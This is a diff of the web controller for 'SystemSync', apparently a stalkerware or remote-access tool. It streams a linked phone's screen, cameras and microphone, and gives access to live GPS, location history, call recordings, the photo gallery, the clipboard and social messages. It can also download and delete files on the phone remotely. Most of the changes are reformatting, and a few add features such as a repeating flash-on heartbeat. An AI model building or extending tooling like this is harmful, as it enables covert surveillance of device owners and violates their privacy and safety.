-            <div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn" class="close-btn">✕</button></div>
+            <div class="popup-controls"><button id="cameraSnapBtn">📸</button><button
+                    id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button
+                    id="cameraCloseBtn" class="close-btn">✕</button></div>
         </div>
     </div>
     <div id="audioModalOverlay" class="modal-overlay">
         <div class="mobile-popup">
             <div class="phone-frame"><audio id="modalAudioPlayer" controls style="width:100%;"></audio></div>
-            <div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn" class="close-btn">✕</button></div>
+            <div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn"
+                    class="close-btn">✕</button></div>
         </div>
     </div>
     <div id="sidebar">
         <div class="logo">SystemSync 🔗<button id="sidebarCloseBtn" onclick="closeSidebar()">✕</button></div>
         <div class="section">
+            <div class="section-title">Device</div>
+            <button id="overviewBtn"><span>🏠</span> Overview Dashboard</button>
+        </div>
+        <div class="section">
             <div class="section-title">Surveillance</div>
             <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
             <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
             <div id="clickCameraPanel" class="camera-panel">
-                <div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked onchange="toggleFlashOptions()"> Front</label><label><input type="radio" name="clickCameraSelect" value="back" onchange="toggleFlashOptions()"> Rear</label></div>
-                <div class="camera-option" id="clickFlashContainer" style="display:none;"><label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button>
+                <div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked
+                            onchange="toggleFlashOptions()"> Front</label><label><input type="radio"
+                            name="clickCameraSelect" value="back" onchange="toggleFlashOptions()"> Rear</label></div>
+                <div class="camera-option" id="clickFlashContainer" style="display:none;"><label><input type="checkbox"
+                            id="clickFlashCheckbox"> Use flash</label></div><button class="capture-btn"
+                    id="capturePictureBtn">TAKE PICTURE</button>
             </div>
             <button id="liveCameraBtn"><span>📹</span> See Live</button>
             <div id="liveCameraPanel" class="camera-panel">
-                <div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked onchange="toggleFlashOptions()"> FrontCAM</label><label><input type="radio" name="liveCameraSelect" value="back" onchange="toggleFlashOptions()"> BackCAM</label></div>
-                <div class="camera-option"><label id="liveFlashContainer" style="display:none;"><input type="checkbox" id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button>
+                <div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked
+                            onchange="toggleFlashOptions()"> FrontCAM</label><label><input type="radio"
+                            name="liveCameraSelect" value="back" onchange="toggleFlashOptions()"> BackCAM</label></div>
+                <div class="camera-option"><label id="liveFlashContainer" style="display:none;"><input type="checkbox"
+                            id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox"
+                            checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start
+                    Live</button>
             </div>
             <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
             <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop</button>
-            <button id="getLocationBtn"><span>📍</span> GPS Location</button>
+            <button id="liveGpsBtn"><span>🛰️</span> Live GPS Track</button>
         </div>
         <div class="section">
             <div class="section-title">Data</div>
@@ -744,7 +1566,6 @@
             <button id="clipboardBtn"><span>📋</span> Clipboard</button>
             <button id="geofenceBtn"><span>🗺️</span> Geofence</button>
             <button id="autoCaptureBtn"><span>⏱️</span> Auto Capture</button>
-            <button id="liveGpsBtn"><span>🛰️</span> Live GPS Track</button>
             <button id="locationHistoryBtn"><span>📍</span> Location History</button>
             <button id="callRecordingsBtn"><span>🎙️</span> Call Recordings</button>
             <button id="photoGalleryBtn"><span>🖼️</span> Photo Gallery</button>
@@ -759,17 +1580,24 @@
             <button id="vibrateBtn"><span>📳</span> Vibrate</button>
             <button id="toggleFlashBtn"><span>🔦</span> <span id="flashBtn">Flash On</span></button>
         </div>
-        <div id="alertsBadge" style="display:none;"><strong>⚠️ Alerts</strong><div id="alertsList"></div><button id="clearAlertsBtn">Clear</button></div>
+        <div id="alertsBadge" style="display:none;"><strong>⚠️ Alerts</strong>
+            <div id="alertsList"></div><button id="clearAlertsBtn">Clear</button>
+        </div>
         <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
     </div>
     <div id="main">
         <div id="header">
-            <div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn" style="display:none; margin-left:12px; font-size:12px; padding:4px 8px; border-radius:4px; border:1px solid var(--border); background:var(--danger-bg); color:var(--danger); cursor:pointer; font-weight:600;" onclick="leaveDevice()">Leave Device</button></span></div>
+            <div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span
+                        id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn"
+                        style="display:none; margin-left:12px; font-size:12px; padding:4px 8px; border-radius:4px; border:1px solid var(--border); background:var(--danger-bg); color:var(--danger); cursor:pointer; font-weight:600;"
+                        onclick="leaveDevice()">Leave Device</button></span></div>
             <div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div>
         </div>
         <div id="downloadProgress">
             <div><span id="progressFileName">Downloading...</span><span id="progressPercent">0%</span></div>
-            <div><div id="progressBar"></div></div>
+            <div>
+                <div id="progressBar"></div>
+            </div>
         </div>
         <div id="content">
             <div id="main-panel">🔌 Initializing connection...</div>
@@ -804,12 +1632,14 @@
         let mediaRecorder = null, recordedChunks = [], pendingCommand = null, newAlerts = [];
         let screenMediaRecorder = null, screenRecordedChunks = [];
         let currentCameraStream = null, currentAudioStream = null;
+        let currentSortCol = -1, currentSortDir = 'desc';
         let socialMsgsData = [], currentLocation = null;
+        let flashHeartbeat = null;
         let deviceInfoRefreshInterval = null;
         let currentMapType = 'street';
         let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false;
         let fileTreeCache = {};
-        let expandedFolders = new Set(['root']);
+        let expandedFolders = new Set(['root']); // Keep track of open tree categories
 
         const panel = document.getElementById('main-panel');
         const statusEl = document.getElementById('status');
@@ -820,6 +1650,16 @@
         function formatBytes(b) { if (b === 0) return '0 B'; const i = Math.floor(Math.log(b) / Math.log(1024)); return (b / Math.pow(1024, i)).toFixed(1) + ' ' + ['B', 'KB', 'MB', 'GB'][i]; }
         function formatDuration(ms) { const h = Math.floor(ms / 3600000); const m = Math.floor((ms % 3600000) / 60000); const s = Math.floor((ms % 60000) / 1000); return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`; }
         function formatDurationSeconds(seconds) { if (!seconds) return ''; const mins = Math.floor(seconds / 60); const secs = seconds % 60; return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`; }
+        function formatAnyDate(val) {
+            if (!val) return '';
+            // If it's already a formatted string (contains / or :) just return it
+            if (typeof val === 'string' && (val.includes('/') || val.includes(':')) && val.length > 10) return val;
+            const timestamp = isNaN(val) ? Date.parse(val) : parseInt(val);
+            if (isNaN(timestamp)) return val;
+            // Handle seconds vs milliseconds (ms > 10^12)
+            const d = new Date(timestamp < 10000000000 ? timestamp * 1000 : timestamp);
+            return d.toLocaleString();
+        }
         function getColorForDuration(ms) { if (ms > 3600000) return '#d32f2f'; if (ms > 1800000) return '#ff9800'; return '#4caf50'; }
         function setStatus(s) { statusEl.innerText = s; if (s === 'ONLINE') { statusEl.classList.remove('offline'); statusEl.style.background = '#e8f5e9'; statusEl.style.color = '#2e7d32'; } else { statusEl.classList.add('offline'); statusEl.style.background = '#ffebee'; statusEl.style.color = '#c62828'; } }
         function showNotification(t) { const o = statusEl.innerText; statusEl.innerText = t; setTimeout(() => statusEl.innerText = o, 2000); }
@@ -829,13 +1669,14 @@
         function toggleSidebar() { const sb = document.getElementById('sidebar'), ov = document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if (ov) ov.classList.toggle('show'); }
         function closeSidebar() { const sb = document.getElementById('sidebar'), ov = document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if (ov) ov.classList.remove('show'); }
 
-        // ==================== AUTH (unchanged) ====================
+        // ==================== AUTH ====================
         function toggleFlashOptions() {
             const clickCam = document.querySelector('input[name="clickCameraSelect"]:checked').value;
             document.getElementById('clickFlashContainer').style.display = (clickCam === 'back') ? 'block' : 'none';
             const liveCam = document.querySelector('input[name="liveCameraSelect"]:checked').value;
             document.getElementById('liveFlashContainer').style.display = (liveCam === 'back') ? 'inline-block' : 'none';
         }
+
         function renderAuthForm() {
             const c = document.getElementById('authBox');
             if (isLoginMode) c.innerHTML = `<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode" tabindex="0">Don't have an account? Sign up</div><div id="authError"></div>`;
@@ -843,6 +1684,7 @@
             document.getElementById('authBtn').onclick = handleAuth;
             document.getElementById('toggleAuthMode').onclick = (e) => { e.preventDefault(); isLoginMode = !isLoginMode; renderAuthForm(); };
         }
+
         async function handleAuth() {
             const email = document.getElementById('authEmail').value.trim();
             const pwd = document.getElementById('authPassword').value.trim();
@@ -863,6 +1705,7 @@
                 btn.innerText = isLoginMode ? 'Sign In' : 'Sign Up';
             }
         }
+
         function logout() {
             auth.signOut();
             if (ws) ws.close();
@@ -873,6 +1716,7 @@
             document.getElementById('deviceListContainer').style.display = 'none';
             document.getElementById('authContainer').style.display = 'flex';
         }
+
         async function loadDevices() {
             if (!currentUser) return;
             const snap = await db.collection('devices').where('userId', '==', currentUser.uid).get();
@@ -889,6 +1733,7 @@
             });
             document.getElementById('deviceListContainer').style.display = 'flex';
         }
+
         window.leaveDevice = function () {
             selectedDeviceId = null;
             document.getElementById('main').style.display = 'none';
@@ -898,7 +1743,13 @@
             if (ws) ws.close();
             if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);
         };
-        window.addEventListener('popstate', (e) => { if (!e.state || e.state.view !== 'device') { if (selectedDeviceId) leaveDevice(); } });
+
+        window.addEventListener('popstate', (e) => {
+            if (!e.state || e.state.view !== 'device') {
+                if (selectedDeviceId) leaveDevice();
+            }
+        });
+
         function selectDevice(id, name) {
             history.pushState({ view: 'device' }, '', '#device');
             document.getElementById('headerLeaveBtn').style.display = 'inline-block';
@@ -908,30 +1759,39 @@
             document.getElementById('main').style.display = 'flex';
             document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(name || id)} <span style="font-size:12px; color:#666;" id="lastSeenSpan"></span>`;
             connectWebSocket();
+            renderDeviceOverview(); // Load dashboard by default
             loadDeviceInfoAndSchedule();
         }
+
         async function loadDeviceInfoAndSchedule() {
             if (!selectedDeviceId || !currentUser) return;
             await loadDeviceInfo();
             if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);
             deviceInfoRefreshInterval = setInterval(() => loadDeviceInfo(), 30000);
         }
+
         async function loadDeviceInfo() {
             if (!selectedDeviceId || !currentUser) return;
             try {
                 const doc = await db.collection('devices').doc(selectedDeviceId).get();
                 if (doc.exists) {
                     const data = doc.data();
-                    const name = data.name || 'Unnamed';
+                    const name = data.name || data.deviceModel || 'Unnamed';
                     const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleString() : 'Never';
                     document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(name)} <span style="font-size:12px; color:#666;">(last seen: ${escapeHtml(lastSeen)})</span>`;
+                    
+                    // Refresh Overview if it's currently showing
+                    const activePanelHeader = panel.querySelector('h1');
+                    if (activePanelHeader && activePanelHeader.innerText.includes(name)) {
+                        renderDeviceOverview(true); // pass true to skip 'Building dashboard...' message
+                    }
                 } else {
                     document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(selectedDeviceId)} <span style="font-size:12px; color:#666;">(no info)</span>`;
                 }
             } catch (e) { console.warn('Failed to load device info:', e); }
         }
 
-        // ==================== WEBSOCKET (unchanged) ====================
+        // ==================== WEBSOCKET ====================
         function connectWebSocket() {
             if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
             if (reconnectTimer) clearTimeout(reconnectTimer);
@@ -944,7 +1804,9 @@
             ws.onclose = () => { setStatus('OFFLINE'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: closed'; panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws = null; const d = Math.min(1000 * Math.pow(1.5, reconnectAttempts), CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer = setTimeout(() => connectWebSocket(), d); };
             ws.onerror = () => { setStatus('ERROR'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error'; };
         }
+
         function manualReconnect() { if (reconnectTimer) clearTimeout(reconnectTimer); if (ws) ws.close(); reconnectAttempts = 0; connectWebSocket(); }
+
         function sendCommand(cmd, params = {}) {
             if (!ws || ws.readyState !== WebSocket.OPEN) { panel.innerHTML = '<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>'; return; }
             const payload = { type: 'COMMAND', command: cmd, requestId: 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5), params, deviceId: selectedDeviceId, timestamp: Date.now() };
@@ -953,9 +1815,10 @@
             pendingCommand = cmd;
             setTimeout(() => { if (pendingCommand === cmd) pendingCommand = null; }, 10000);
         }
+
         function sendPlainText(t) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(t); }
 
-        // ==================== WEBRTC (unchanged) ====================
+        // ==================== WEBRTC ====================
         function createPeerConnection(type, onTrack, useMic, iceServers = CONFIG.ICE_SERVERS) {
             const pc = new RTCPeerConnection({ iceServers: iceServers });
             if (type === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
@@ -966,11 +1829,14 @@
             pc.oniceconnectionstatechange = () => console.log(`${type} ICE state:`, pc.iceConnectionState);
             return pc;
         }
+
         function sendSignaling(msg) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'SIGNALING', deviceId: selectedDeviceId, data: msg })); }
+
         function handleSignaling(msg) {
             if (msg.type === 'ANSWER') { const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC; if (pc) pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: msg.sdp })); }
             else if (msg.type === 'ICE_CANDIDATE') { const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC; if (pc && msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
         }
+
         async function toggleScreen() {
             if (screenActive) {
                 if (screenPC) screenPC.close(); screenPC = null; screenActive = false;
@@ -989,7 +1855,10 @@
                 if (modalVideo) modalVideo.srcObject = null;
                 screenPC = createPeerConnection('screen', e => {
                     const modalVideo = document.getElementById('modalScreenVideo');
-                    if (modalVideo && e.streams[0]) { modalVideo.srcObject = e.streams[0]; console.log('Screen stream received'); }
+                    if (modalVideo && e.streams[0]) {
+                        modalVideo.srcObject = e.streams[0];
+                        console.log('Screen stream received');
+                    }
                 }, false);
                 try {
                     const offer = await screenPC.createOffer();
@@ -1009,50 +1878,82 @@
                 }
             }
         }
+
         function snapScreenFromModal() {
             const video = document.getElementById('modalScreenVideo');
-            if (!video || !video.videoWidth) { alert('No active screen share or video not ready yet. Please wait a moment.'); return; }
+            if (!video || !video.videoWidth) {
+                alert('No active screen share or video not ready yet. Please wait a moment.');
+                return;
+            }
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             canvas.toBlob(blob => {
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
-                a.download = `screen-${Date.now()}.png`; a.href = url; a.click(); URL.revokeObjectURL(url);
+                a.download = `screen-${Date.now()}.png`;
+                a.href = url;
+                a.click();
+                URL.revokeObjectURL(url);
                 showNotification('Screenshot saved');
             }, 'image/png');
         }
+
         function toggleScreenRecording() {
             const video = document.getElementById('modalScreenVideo');
-            if (!video || !video.srcObject) { alert('No active screen share. Start screen share first.'); return; }
+            if (!video || !video.srcObject) {
+                alert('No active screen share. Start screen share first.');
+                return;
+            }
             if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
                 screenMediaRecorder.stop();
                 document.getElementById('modalRecordBtn').innerText = '🔴';
                 showNotification('Recording stopped');
             } else {
-                if (video.videoWidth === 0) { video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true }); }
-                else { startScreenRecording(); }
+                if (video.videoWidth === 0) {
+                    video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
+                } else {
+                    startScreenRecording();
+                }
             }
         }
+
         function startScreenRecording() {
             const video = document.getElementById('modalScreenVideo');
-            if (!video || !video.videoWidth) { alert('Video not ready. Please wait.'); return; }
+            if (!video || !video.videoWidth) {
+                alert('Video not ready. Please wait.');
+                return;
+            }
             screenRecordedChunks = [];
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            const drawFrame = () => { if (video.videoWidth && video.videoHeight) ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(drawFrame); };
+            const drawFrame = () => {
+                if (video.videoWidth && video.videoHeight) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                }
+                requestAnimationFrame(drawFrame);
+            };
             drawFrame();
             const canvasStream = canvas.captureStream(30);
             const originalStream = video.srcObject;
-            if (originalStream && originalStream.getAudioTracks().length) originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+            if (originalStream && originalStream.getAudioTracks().length) {
+                originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+            }
             screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-            screenMediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenRecordedChunks.push(e.data); };
+            screenMediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) screenRecordedChunks.push(e.data);
+            };
             screenMediaRecorder.onstop = () => {
                 const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
-                a.href = url; a.download = `screen-recording-${Date.now()}.webm`; a.click(); URL.revokeObjectURL(url);
+                a.href = url;
+                a.download = `screen-recording-${Date.now()}.webm`;
+                a.click();
+                URL.revokeObjectURL(url);
                 screenRecordedChunks = [];
                 showNotification('Recording saved');
             };
@@ -1060,14 +1961,21 @@
             document.getElementById('modalRecordBtn').innerText = '🟢';
             showNotification('Recording started');
         }
+
         function toggleFullscreen() {
             const video = document.getElementById('modalScreenVideo');
             if (!video) return;
-            if (!document.fullscreenElement) { video.requestFullscreen().catch(err => console.warn('Fullscreen error:', err)); }
-            else { document.exitFullscreen(); }
+            if (!document.fullscreenElement) {
+                video.requestFullscreen().catch(err => console.warn('Fullscreen error:', err));
+            } else {
+                document.exitFullscreen();
+            }
         }
+
         function closeScreenModal() {
-            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
+            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+                screenMediaRecorder.stop();
+            }
             document.getElementById('screenModalOverlay').classList.remove('show');
             document.body.classList.remove('modal-open');
             if (screenActive) {
@@ -1081,23 +1989,32 @@
             if (modalVideo) modalVideo.srcObject = null;
             document.getElementById('modalRecordBtn').innerText = '🔴';
         }
+
         document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
         document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
         document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
         document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);
 
-        // ==================== CAMERA MODAL (unchanged) ====================
-        function showCameraModal(stream, cameraType) {
+        // ==================== CAMERA MODAL ====================
+        function showCameraModal(stream, cameraType, useFlash = false) {
             const modal = document.getElementById('cameraModalOverlay');
             const video = document.getElementById('modalCameraVideo');
             video.srcObject = stream;
             currentCameraStream = stream;
             modal.classList.add('show');
             document.body.classList.add('modal-open');
+            
+            // Activate flash and start heartbeat if requested and using back camera
+            if (useFlash && cameraType === 'back') {
+                sendCommand('FLASH_ON');
+                if (flashHeartbeat) clearInterval(flashHeartbeat);
+                flashHeartbeat = setInterval(() => sendCommand('FLASH_ON'), 5000); 
+            }
             let recording = false, recorder = null, chunks = [];
             document.getElementById('cameraSnapBtn').onclick = () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(b => { const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = `snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); });
             };
@@ -1106,7 +2023,8 @@
                 else {
                     chunks = [];
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     const draw = () => { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(draw); };
                     draw();
@@ -1117,7 +2035,10 @@
                     recorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
                         const a = document.createElement('a');
-                        a.href = URL.createObjectURL(blob); a.download = `recording_${Date.now()}.webm`; a.click(); URL.revokeObjectURL(blob);
+                        a.href = URL.createObjectURL(blob);
+                        a.download = `recording_${Date.now()}.webm`;
+                        a.click();
+                        URL.revokeObjectURL(blob);
                         canvasStream.getTracks().forEach(t => t.stop());
                     };
                     recorder.start();
@@ -1127,6 +2048,7 @@
             };
             document.getElementById('cameraFullscreenBtn').onclick = () => { if (video.requestFullscreen) video.requestFullscreen(); };
             document.getElementById('cameraCloseBtn').onclick = () => {
+                if (flashHeartbeat) { clearInterval(flashHeartbeat); flashHeartbeat = null; }
                 if (recorder && recorder.state === 'recording') recorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
                 modal.classList.remove('show');
@@ -1137,16 +2059,21 @@
                 sendCommand('FLASH_OFF');
             };
         }
+
         async function startLiveCamera() {
             const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
             const useFlash = document.getElementById('liveFlashCheckbox').checked;
             const useMic = document.getElementById('liveMicCheckbox').checked;
+            
+            // Send immediate command alongside signaling
             if (useFlash && camera === 'back') sendCommand('FLASH_ON');
-            cameraPC = createPeerConnection('camera', e => showCameraModal(e.streams[0], camera), useMic);
+            
+            cameraPC = createPeerConnection('camera', e => showCameraModal(e.streams[0], camera, useFlash), useMic);
             const offer = await cameraPC.createOffer();
             await cameraPC.setLocalDescription(offer);
             sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera, flash: useFlash, mic: useMic });
         }
+
         function stopLiveStream() {
             if (cameraPC) cameraPC.close();
             cameraPC = null;
@@ -1154,6 +2081,7 @@
             sendCommand('FLASH_OFF');
             panel.innerHTML = 'Ready.';
         }
+
         function showAudioModal(stream) {
             const modal = document.getElementById('audioModalOverlay');
             const audio = document.getElementById('modalAudioPlayer');
@@ -1171,7 +2099,10 @@
                     recorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
                         const a = document.createElement('a');
-                        a.href = URL.createObjectURL(blob); a.download = `audio_${Date.now()}.webm`; a.click(); URL.revokeObjectURL(blob);
+                        a.href = URL.createObjectURL(blob);
+                        a.download = `audio_${Date.now()}.webm`;
+                        a.click();
+                        URL.revokeObjectURL(blob);
                     };
                     recorder.start();
                     recording = true;
@@ -1186,6 +2117,7 @@
                 stopLiveAudio();
             };
         }
+
         async function startLiveAudio() {
             audioPC = createPeerConnection('audio', e => showAudioModal(e.streams[0]), true);
             const offer = await audioPC.createOffer();
@@ -1194,6 +2126,7 @@
             document.getElementById('liveAudioBtn').style.display = 'none';
             document.getElementById('stopLiveAudioBtn').style.display = 'block';
         }
+
         function stopLiveAudio() {
             if (audioPC) audioPC.close();
             audioPC = null;
@@ -1203,7 +2136,7 @@
             panel.innerHTML = 'Ready.';
         }
 
-        // ==================== FILE MANAGER (unchanged from index1) ====================
+        // ==================== FILE MANAGER (EXACTLY FROM index (16).html) ====================
         function renderFiles() {
             let html = `
             <div class="file-manager">
@@ -1211,8 +2144,12 @@
                     <div class="file-toolbar">
                         <span style="font-weight: 600; color: #1a2634; font-size: 14px; margin-left: 8px;">File Browser</span>
                         <div style="display: flex; gap: 8px; margin-left: auto;">
-                            <button onclick="downloadSelected()" style="flex:1; display: flex; align-items: center; justify-content: center; gap: 4px;">⬇️ <span id="downloadCount">${selectedFiles.length}</span></button>
-                            <button onclick="deleteSelected()" style="flex:1; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; gap: 4px;">🗑️ <span id="deleteCount">${selectedFiles.length}</span></button>
+                            <button onclick="downloadSelected()" style="flex:1; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                                ⬇️ <span id="downloadCount">${selectedFiles.length}</span>
+                            </button>
+                            <button onclick="deleteSelected()" style="flex:1; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                                🗑️ <span id="deleteCount">${selectedFiles.length}</span>
+                            </button>
                         </div>
                     </div>
                 </div>
@@ -1224,48 +2161,108 @@
             </div>`;
             panel.innerHTML = html;
         }
+
         function generateTreeHtml(path) {
             let html = '';
             const items = fileTreeCache[path];
             if (!items) return '<li style="padding-left:24px; color:#7b8a9b; font-size:12px;">Loading...</li>';
+
             if (items.length === 0) return '<li style="padding-left:24px; color:#7b8a9b; font-size:12px;">Empty folder</li>';
+
             const folders = items.filter(item => item.isDir).sort((a, b) => a.name.localeCompare(b.name));
             const files = items.filter(item => !item.isDir).sort((a, b) => a.name.localeCompare(b.name));
+
             folders.forEach(f => {
                 const isOpen = expandedFolders.has(f.path);
                 const caretCls = isOpen ? 'caret caret-down' : 'caret';
                 const nestedCls = isOpen ? 'nested active' : 'nested';
-                html += `<li><div class="tree-item folder-item" onclick="handleFolderClick(event, '${f.path}')"><span class="${caretCls}">▶</span><span class="folder-icon">📁</span><span class="folder-name">${f.name}</span></div><ul class="${nestedCls}">${isOpen ? generateTreeHtml(f.path) : ''}</ul></li>`;
+
+                html += `
+                <li>
+                    <div class="tree-item folder-item" onclick="handleFolderClick(event, '${f.path}')">
+                        <span class="${caretCls}">▶</span>
+                        <span class="folder-icon">📁</span>
+                        <span class="folder-name">${f.name}</span>
+                    </div>
+                    <ul class="${nestedCls}">
+                        ${isOpen ? generateTreeHtml(f.path) : ''}
+                    </ul>
+                </li>`;
             });
+
             files.forEach(f => {
                 const pathStr = f.path;
                 const isChecked = selectedFiles.includes(pathStr) ? 'checked' : '';
-                html += `<li><div class="tree-item file-item"><span style="width:16px;"></span><input type="checkbox" class="file-checkbox" data-path="${pathStr}" onchange="updateSelected(this)" ${isChecked}><span class="file-icon">📄</span><span class="file-name">${f.name}</span><span class="file-size">${formatBytes(f.size)}</span></div></li>`;
+                html += `
+                <li>
+                    <div class="tree-item file-item">
+                        <span style="width:16px;"></span> <!-- spacer for caret -->
+                        <input type="checkbox" class="file-checkbox" data-path="${pathStr}" onchange="updateSelected(this)" ${isChecked}>
+                        <span class="file-icon">📄</span>
+                        <span class="file-name">${f.name}</span>
+                        <span class="file-size">${formatBytes(f.size)}</span>
+                    </div>
+                </li>`;
             });
+
             return html;
         }
+
         function handleFolderClick(event, path) {
             event.stopPropagation();
             currentPath = path;
-            if (expandedFolders.has(path)) { expandedFolders.delete(path); renderFiles(); }
-            else { expandedFolders.add(path); if (!fileTreeCache[path]) { sendCommand('LIST_FILES', { path: path }); renderFiles(); } else renderFiles(); }
+
+            if (expandedFolders.has(path)) {
+                expandedFolders.delete(path);
+                renderFiles();
+            } else {
+                expandedFolders.add(path);
+                if (!fileTreeCache[path]) {
+                    sendCommand('LIST_FILES', { path: path });
+                    renderFiles();
+                } else {
+                    renderFiles();
+                }
+            }
         }
+
         function updateSelected(checkbox) {
             const path = checkbox.dataset.path;
-            if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
-            else { selectedFiles = selectedFiles.filter(p => p !== path); }
+            if (checkbox.checked) {
+                if (!selectedFiles.includes(path)) selectedFiles.push(path);
+            } else {
+                selectedFiles = selectedFiles.filter(p => p !== path);
+            }
             updateCounters();
         }
+
         function downloadSelected() {
-            if (selectedFiles.length === 0) { alert('No files selected'); return; }
-            selectedFiles.forEach(path => sendPlainText('dl ' + path));
+            if (selectedFiles.length === 0) {
+                alert('No files selected');
+                return;
+            }
+            selectedFiles.forEach(path => {
+                sendPlainText('dl ' + path);
+            });
         }
+
         function deleteSelected() {
-            if (selectedFiles.length === 0) { alert('No files selected'); return; }
-            if (!confirm(`Delete ${selectedFiles.length} file(s)? This action cannot be undone.`)) return;
-            selectedFiles.forEach(path => sendCommand('DELETE_FILE', { path: path }));
